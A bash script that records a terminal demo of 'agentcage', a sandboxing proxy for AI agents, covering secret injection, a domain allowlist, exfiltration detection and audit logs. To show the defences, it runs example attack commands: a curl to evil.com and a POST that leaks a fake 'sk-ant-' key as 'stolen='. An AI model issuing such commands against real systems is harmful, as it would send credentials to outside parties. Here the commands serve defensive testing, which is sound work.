#!/usr/bin/env bash
# ── agentcage asciinema demo ─────────────────────────────────────────
# Usage:
#   ./demo-prep.sh
#   asciinema rec demo.cast -c ./demo.sh --cols 110 --rows 32 --overwrite
# ─────────────────────────────────────────────────────────────────────
set -e

DELAY=0.035
PAUSE=1.5
LONG_PAUSE=2.5

type_cmd() {
  printf '\033[1;32m❯\033[0m '
  for (( i=0; i<${#1}; i++ )); do
    printf '%s' "${1:$i:1}"
    sleep "$DELAY"
  done
  sleep 0.4
  echo
}

run() { type_cmd "$1"; eval "$1" 2>&1; sleep "$PAUSE"; }

banner() {
  echo
  printf '\033[1;36m── %s ──\033[0m\n' "$1"
  echo
  sleep "$LONG_PAUSE"
}

note() {
  echo
  printf '\033[38;5;243m  # %s\033[0m\n' "$1"
  sleep 1
}

# ── Read API key from prep script ─────────────────────────────────────
REAL_KEY=$(cat /tmp/.demo-key)

# ── Title ────────────────────────────────────────────────────────────
clear
sleep 0.5
printf '\n'
printf '\033[1;36m'
cat <<'ART'
           ╔══════════════════════════════════════════════╗
           ║ agentcage — don't let your agent phone home  ║
           ╚══════════════════════════════════════════════╝
ART
printf '\033[0m'
printf '\033[38;5;243m         Defense-in-depth proxy sandbox for AI agents\033[0m\n'
sleep 3

# ═════════════════════════════════════════════════════════════════════
banner "1. Write a cage config"
# ═════════════════════════════════════════════════════════════════════

note "Define the container image, allowed domains, and secret injection rules"

cat > /tmp/cage.yaml <<'YAML'
name: demo

container:
  image: "alpine/curl"
  command: ["sleep", "infinity"]

domains:
  allow:
    - api.anthropic.com
    - httpbin.org

secret_injection:
  - env: ANTHROPIC_API_KEY
    placeholder: "{{ANTHROPIC_API_KEY}}"
    inject_to:
      - api.anthropic.com

logging:
  level: info
  allowed_requests: true
YAML

run "cat /tmp/cage.yaml"

# ═════════════════════════════════════════════════════════════════════
banner "2. Store a secret"
# ═════════════════════════════════════════════════════════════════════

note "Store an API key — it's encrypted and never reaches the agent"
type_cmd "agentcage secret set demo ANTHROPIC_API_KEY"
printf 'sk-ant-••••••••••••••••\n'
printf "Secret 'demo.ANTHROPIC_API_KEY' set.\n"
printf '%s\n' "$REAL_KEY" | agentcage secret set demo ANTHROPIC_API_KEY >/dev/null 2>&1
sleep "$PAUSE"

# ═════════════════════════════════════════════════════════════════════
banner "3. Create the cage"
# ═════════════════════════════════════════════════════════════════════

note "Spin up 3 containers: agent, DNS sidecar, and inspecting proxy"
type_cmd "agentcage cage create -c /tmp/cage.yaml"
printf 'Building images...\n'
agentcage cage create -c /tmp/cage.yaml >/dev/null 2>&1
printf 'Started demo-cage\n'
sleep "$PAUSE"

note "Verify the cage is running"
run "agentcage cage show demo"

# ═════════════════════════════════════════════════════════════════════
banner "4. Secret injection"
# ═════════════════════════════════════════════════════════════════════

note "Let's see what the agent sees for its API key"
run "agentcage cage exec demo -- printenv ANTHROPIC_API_KEY"

note "Just a placeholder! The proxy swaps it for the real key on the wire."
note "The agent can never read, log, or exfiltrate the real credential."
sleep "$LONG_PAUSE"

note "Let's prove it — call the real Anthropic API from inside the cage"

# Write request body into the cage
agentcage cage exec demo -- sh -c 'cat > /tmp/request.json << EOF
{
  "model": "claude-haiku-4-5-20251001",
  "max_tokens": 32,
  "messages": [{"role": "user", "content": "Say hello in 5 words"}]
}
EOF' 2>/dev/null

type_cmd 'agentcage cage exec demo -- sh -c '\''curl -s https://api.anthropic.com/v1/messages -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d @/tmp/request.json'\'
agentcage cage exec demo -- sh -c 'curl -s https://api.anthropic.com/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d @/tmp/request.json' 2>&1 | python3 -m json.tool
sleep 1

note "Real API response! The proxy injected the real key — the agent never had it."
sleep "$LONG_PAUSE"

# ═════════════════════════════════════════════════════════════════════
banner "5. Domain filtering"
# ═════════════════════════════════════════════════════════════════════

note "httpbin.org is on the allowlist — request goes through"
run "agentcage cage exec demo -- curl -s -o /dev/null -w '%{http_code}\n' https://httpbin.org/get"

note "evil.com is NOT on the allowlist — blocked by the proxy"
run "agentcage cage exec demo -- curl -s https://evil.com"

# ═════════════════════════════════════════════════════════════════════
banner "6. Exfiltration detection"
# ═════════════════════════════════════════════════════════════════════

note "What if the agent tries to leak something that looks like an API key?"
run "agentcage cage exec demo -- curl -s -X POST https://httpbin.org/post -d 'stolen=sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAA'"

note "Caught! The proxy scans every request body for secret patterns."
sleep "$PAUSE"

# ═════════════════════════════════════════════════════════════════════
banner "7. Audit log"
# ═════════════════════════════════════════════════════════════════════

note "Every proxy decision is logged — allowed, blocked, and why"
run "agentcage cage audit demo"

# ── Fin ──────────────────────────────────────────────────────────────
sleep 1
printf '\n'
printf '\033[1m  https://agentcage.ai\033[0m\n'
printf '\n'
sleep 5
